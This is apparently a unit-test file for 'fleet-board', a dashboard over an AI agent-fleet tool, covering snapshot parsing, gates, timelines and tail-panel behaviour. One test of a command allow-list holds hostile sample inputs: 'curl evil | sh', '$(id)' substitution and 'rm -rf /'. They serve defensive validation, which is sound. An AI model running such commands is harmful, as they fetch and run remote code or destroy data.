// fleet-board's pure modules: run with `node --test tests/unit/`.
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { dur, timeline, graph, shortener, natural, wordsOf, readOnly, shq, gateText, fixRounds, tipText, fleetTailLines } from "../../mods/fleet-board/model.js";
import { normalize, gatesOf, summarize, runKey, parseRuns, parseSnapshot, failure, changedRepos, relevant, stateRoot, epicPhase } from "../../mods/fleet-board/snapshot.js";

const T = (min) => new Date(Date.UTC(2026, 10, 16, 10, min)).toISOString();
const raw = (over = {}) => ({
  schema: 1, generated: T(30), run_dir: "/s/agent-fleet/acme-web/epics/acme.ep",
  epic: { id: "acme.ep", wave: { running: true, number: 2, started: T(0) }, workers: { used: 1, max: 3 }, beads: { total: 3, done: 1, parked: 1, running: 1 } },
  beads: [
    { id: "acme.ep.1", state: "done", history: [{ step: "implement", round: 0, wave: 1, start: T(0), end: T(5), outcome: "done" }, { step: "merge", round: 0, wave: 1, start: null, end: T(6), outcome: "merged" }] },
    { id: "acme.ep.2", state: "parked", blockers: ["acme.ep.1"], gate: { id: "g1", kind: "questions", shown: "questions", reason: "questions: How many?", since: T(10) }, history: [] },
    { id: "acme.ep.3", state: "running", blockers: ["acme.ep.2"], step_started: T(20), history: [{ step: "implement", round: 0, wave: 2, start: T(20), end: null }] },
  ],
  ...over,
});

test("dur shows whole minutes, hours and days", () => {
  assert.equal(dur(30_000), "<1m");
  assert.equal(dur(5 * 60_000), "5m");
  assert.equal(dur(125 * 60_000), "2h05");
  assert.equal(dur(26 * 3600_000), "1d2h");
  assert.equal(dur(null), "-");
  assert.equal(dur(-1), "-");
});

test("normalize turns times into epoch ms and fills what an older snapshot leaves out", () => {
  const s = normalize(raw({ epic: { id: "acme.ep", wave: {} } }), "/r");
  assert.equal(s.epic.workers.used, 0);
  assert.equal(s.epic.beads.total, 0);
  assert.equal(s.epic.wave.running, false);
  const full = normalize(raw(), "/r");
  assert.equal(full.beads[0].history[1].start, full.beads[0].history[0].end, "a merge with no start starts where the step before it ended");
  assert.equal(full.beads[1].gate.since, Date.parse(T(10)));
});

test("a run has one key whether summarized from a snapshot or listed by fleet runs", () => {
  const sum = summarize(normalize(raw(), "/code/acme-web/.worktrees/x"), "/code/acme-web/.worktrees/x");
  assert.equal(sum.key, runKey("acme-web", "acme.ep"));
  const listed = parseRuns(JSON.stringify({ schema: 1, runs: [{ repo: "/code/acme-web", repo_name: "acme-web", epic: "acme.ep", beads: { total: 3 } }] }));
  assert.equal(listed[0].key, sum.key);
  assert.equal(parseRuns("not json"), null);
  assert.equal(parseRuns(JSON.stringify({ schema: 2, runs: [] })), null);
  // A run recorded before agent-fleet kept its repository's path has nowhere to read it from: no chip.
  assert.deepEqual(parseRuns(JSON.stringify({ schema: 1, runs: [{ repo: null, repo_name: "old", epic: "old.ep" }] })), []);
  // Every epic, not only a repository's current one; a run without its folder is looked for in the code folder.
  const all = parseRuns(JSON.stringify({ schema: 1, runs: [
    { repo: null, repo_name: "old", epic: "old.ep", finished: true },
    { repo: "/code/web", repo_name: "web", epic: "web.a", current: "web.b" },
    { repo: "/code/web", repo_name: "web", epic: "web.b", current: "web.b" },
  ] }), "/code");
  assert.deepEqual(all.map((r) => [r.cwd, r.epic, r.finished]), [["/code/old", "old.ep", true], ["/code/web", "web.a", false], ["/code/web", "web.b", false]]);
});

test("waits for the person come from gates[]; an open one on a bead that went on ends at its next step", () => {
  const g = (resolved) => ({ id: "g", kind: "questions", opened: T(1), resolved });
  assert.deepEqual(gatesOf({ state: "running" }), []);
  assert.equal(gatesOf({ state: "parked", gates: [g(null)] })[0].resolved, null, "still waiting");
  const went = gatesOf({ state: "running", gates: [g(null)], history: [{ start: T(0) }, { start: T(5) }] })[0];
  assert.equal(went.resolved, Date.parse(T(5)));
  assert.equal(went.how, "went on");
  assert.deepEqual(gatesOf({ state: "dropped", gates: [g(null)], history: [{ start: T(0) }] }), [], "never went on: not counted");
  assert.equal(gatesOf({ state: "done", gates: [g(T(3))] })[0].resolved, Date.parse(T(3)));
});

test("parseSnapshot and failure say what went wrong", () => {
  assert.equal(parseSnapshot(JSON.stringify(raw()), "/r").ok, true);
  assert.equal(parseSnapshot(JSON.stringify(raw({ schema: 9 })), "/r").kind, "error");
  assert.equal(failure(2, "fleet: error: unrecognized arguments: --json").kind, "old");
  assert.equal(failure(1, "fleet: /r/.fleet.toml is missing or empty").kind, "none");
  assert.equal(failure(127, "").kind, "missing");
  assert.equal(failure(1, "boom").kind, "error");
});

test("the state watch reacts to run files only", () => {
  const root = stateRoot("/s/agent-fleet/acme-web/epics/acme.ep");
  assert.equal(root, "/s/agent-fleet/acme-web");
  assert.equal(relevant(root, [`${root}/epics/acme.ep/events.jsonl`]), true);
  assert.equal(relevant(root, [`${root}/epics/acme.ep/beads/x/stream.jsonl`]), false);
  assert.deepEqual([...changedRepos("/s/agent-fleet", ["/s/agent-fleet/acme-web/epics/e/wave.json", "/s/agent-fleet/other/notes.txt"])], ["acme-web"]);
  assert.deepEqual([...changedRepos("/s/agent-fleet", ["/s/agent-fleet"])], ["*"]);
});

test("timeline: agent and check time, a queued gap between waves, rounds", () => {
  const b = { state: "done", history: [
    { step: "implement", round: 0, wave: 1, start: 0, end: 10 * 60_000, outcome: "done", cost: 1 },
    { step: "check", round: 0, wave: 1, start: 10 * 60_000, end: 12 * 60_000, outcome: "pass" },
    { step: "fix", round: 1, wave: 2, start: 42 * 60_000, end: 45 * 60_000, outcome: "done", cost: 0.5 },
  ] };
  const tl = timeline(b, 50 * 60_000);
  assert.equal(tl.wall, 45 * 60_000);
  assert.equal(tl.agents, 13 * 60_000);
  assert.equal(tl.checks, 2 * 60_000);
  assert.equal(tl.queued, 30 * 60_000);
  const gap = tl.parts.find((p) => p.gap);
  assert.deepEqual(gap.waves, [1, 2]);
  assert.deepEqual(tl.rounds.map((r) => [r.round, r.steps.length, r.cost]), [[0, 2, 1], [1, 1, 0.5]]);
  assert.equal(timeline({ state: "queued", history: [] }, 0), null);
});

test("graph: what each open bead unblocks, and the critical path", () => {
  const s = normalize(raw(), "/r");
  const g = graph(s.beads);
  assert.equal(g.reach.get("acme.ep.2"), 1);
  assert.equal(g.reach.get("acme.ep.1"), 0, "a done bead unblocks nothing any more");
  assert.deepEqual(g.chain, ["acme.ep.2", "acme.ep.3"]);
});

test("ids read short; numbers sort as numbers", () => {
  const short = shortener("acme-web-ep");
  assert.equal(short("acme-web-ep.12"), ".12");
  assert.equal(short("acme-web-other.3"), "other.3");
  assert.deepEqual([".10", ".9", ".2"].sort(natural), [".2", ".9", ".10"]);
});

test("a gate's command runs only when it is plain words of fleet or gh pr view", () => {
  assert.deepEqual(wordsOf("fleet resume acme.ep.2"), ["fleet", "resume", "acme.ep.2"]);
  assert.deepEqual(wordsOf("gh pr view 12 --web"), ["gh", "pr", "view", "12", "--web"]);
  for (const bad of ["fleet tail x; curl evil | sh", "fleet tail $(id)", "fleet answer 'x'", "rm -rf /", "fleet", "gh pr merge 1", ""]) {
    assert.equal(wordsOf(bad), null, bad);
  }
  assert.equal(readOnly(["fleet", "tail", "x"]), true);
  assert.equal(readOnly(["fleet", "gate", "show", "x"]), true);
  assert.equal(readOnly(["fleet", "resume", "x"]), false);
});

test("shq makes one shell word of anything", () => {
  for (const s of ["plain", "it's", "$(id)", "a b", "`x`", "\"q\"", "new\nline"]) {
    assert.equal(execFileSync("/bin/sh", ["-c", `printf %s ${shq(s)}`]).toString(), s);
  }
});

test("gate text drops the kind it repeats and shortens paths to their file name", () => {
  assert.equal(gateText({ shown: "questions", reason: "questions: How many?" }), "How many?");
  assert.equal(gateText({ kind: "other", reason: "no handoff at /Users/x/.local/state/a/b/implement-0.handoff.json" }), "no handoff at implement-0.handoff.json");
});

test("fix rounds count rounds, not fix sessions", () => {
  assert.equal(fixRounds({ history: [{ step: "fix", round: 1 }, { step: "fix", round: 1 }, { step: "fix", round: 2 }, { step: "check", round: 2 }] }), 2);
});

test("tooltip text wraps at about 90 characters and stops after 6 lines", () => {
  const long = Array.from({ length: 120 }, (_, i) => `word${i}`).join(" ");
  const tip = tipText(`title\n${long}`);
  const lines = tip.split("\n");
  assert.ok(lines.length <= 6);
  assert.ok(lines.every((l) => l.length <= 92), lines.map((l) => l.length).join(","));
  assert.ok(tip.endsWith(" …"));
  assert.equal(tipText("short"), "short");
  assert.equal(tipText("x".repeat(200)).split("\n")[0].length, 90, "a word longer than a line is cut");
});

test("the epic phase: the last epic check (running, passed, failed) and the last epic.status", () => {
  const ev = (type, ts, detail) => JSON.stringify({ type, ts, detail });
  const passed = ev("epic.check", "2026-11-17T22:44:18+00:00", { head: "cbcdd52e74fd", status: "pass", log: "/run/beads/_epic/check.log" });
  const started = ev("epic.check", "2026-11-17T22:44:18+00:00", { head: "69074e2596f3", status: "started" });
  const status = ev("epic.status", "2026-11-17T22:44:09+00:00", { closed: 5, total: 6, followups: ["e.7", "e.8"], pr: null });
  const p = epicPhase([status, passed, started, "not json"]);
  assert.deepEqual(p.check, { state: "running", head: "69074e2596f3", since: Date.parse("2026-11-17T22:44:18Z") });
  assert.deepEqual(p.status, { closed: 5, total: 6, followups: ["e.7", "e.8"], pr: null });
  assert.equal(epicPhase([started, passed]).check.state, "pass");
  const failed = ev("epic.check", "2026-11-17T23:00:00+00:00", { head: "abc", status: "fail", log: "/l" });
  assert.deepEqual(epicPhase([failed]).check, { state: "fail", head: "abc", at: Date.parse("2026-11-17T23:00:00Z"), log: "/l" });
  assert.deepEqual(epicPhase([]), { check: null, status: null });
  const pr = (v) => epicPhase([ev("epic.status", "2026-11-17T23:00:00+00:00", { closed: 6, total: 6, followups: [], pr: v })]).status.pr;
  assert.deepEqual(pr("https://github.com/acme/api/pull/42"), { url: "https://github.com/acme/api/pull/42", label: "api#42" });
  assert.deepEqual(pr(42), { url: null, label: "#42" });
  assert.deepEqual(pr({ number: 42, url: "https://github.com/acme/api/pull/42", state: "OPEN" }), { url: "https://github.com/acme/api/pull/42", label: "#42 open" });
});

test("a resize handle's drag: the pointer's move in layout units, bigger upward where the sign says so", async () => {
  const { register } = await import("node:module");
  register("./stub-hooks.mjs", import.meta.url);
  const { dragTo } = await import("../../lib/splitter.js");
  const row = { axis: "row", at: 500, from: 230, moved: false };
  assert.equal(dragTo(row, { position: { x: 0, y: 440 } }, 1, -1), 290, "up 60: the tail 60 taller");
  assert.equal(row.moved, true);
  assert.equal(dragTo({ axis: "col", at: 100, from: 200 }, { position: { x: 160, y: 0 } }, 2), 230, "zoom 2: half the pointer's move");
});

test("the tail panel (lib/tailpanel.js): its height, clicked-open lines that went away", async () => {
  const { register } = await import("node:module");
  register("./stub-hooks.mjs", import.meta.url);
  const { tailHeight, pruneOpened, lineKey, TAIL_LINE, TAIL_LINES, TAIL_MIN } = await import("../../lib/tailpanel.js");
  assert.equal(tailHeight(null), TAIL_LINES * TAIL_LINE + 6, "14 lines until dragged");
  assert.equal(tailHeight(10), TAIL_MIN * TAIL_LINE + 6, "at least 3 lines");
  assert.equal(tailHeight(900, 800), 600, "the board's header and a few rows stay");
  assert.equal(tailHeight(300.4, null), 300);
  const lines = Array.from({ length: 30 }, (_, i) => ({ text: `l${i}` }));
  assert.equal(lineKey({ label: "fix-1", text: "x" }), "fix-1\tx");
  assert.equal(lineKey({ text: "x", key: "fix-1   x" }), "fix-1   x");
  const opened = new Set(["\tl29", "\tgone"]);
  assert.deepEqual([...pruneOpened(opened, lines)], ["\tl29"]);
});

test("fleet tail's lines for the panel: the session as the label, attempts and results as marks", () => {
  assert.deepEqual(fleetTailLines(["fix-1   Edit tests/q.py", "review-1  --- attempt 1 2026", "fix-1 result success $0.57", "merge   rebased"]), [
    { label: "fix-1", text: "Edit tests/q.py", kind: "text", key: "fix-1   Edit tests/q.py" },
    { label: "review-1", text: "--- attempt 1 2026", kind: "mark", key: "review-1  --- attempt 1 2026" },
    { label: "fix-1", text: "result success $0.57", kind: "mark", key: "fix-1 result success $0.57" },
    { label: null, text: "merge   rebased", kind: "text", key: "merge   rebased" },
  ]);
});

test("tail panel: a turn up stops following the newest line, sideways in px within the widest line", async () => {
  const { scrolled } = await import("../../lib/tailpanel.js");
  let v = { follow: true, x: 0 };
  assert.equal(scrolled(v, -40, 0, 500).follow, true, "down: still following");
  v = { ...v, ...scrolled(v, 40, 0, 500) };
  assert.equal(v.follow, false, "up: stops following");
  assert.equal(scrolled(v, -40, 0, 500).follow, false, "down again: until ↓ newest");
  v = { ...v, ...scrolled(v, 0, -120, 500) };
  assert.equal(v.x, 120);
  assert.equal(scrolled(v, 0, -900, 500).x, 500);
  assert.equal(scrolled(v, 0, 900, 500).x, 0);
});

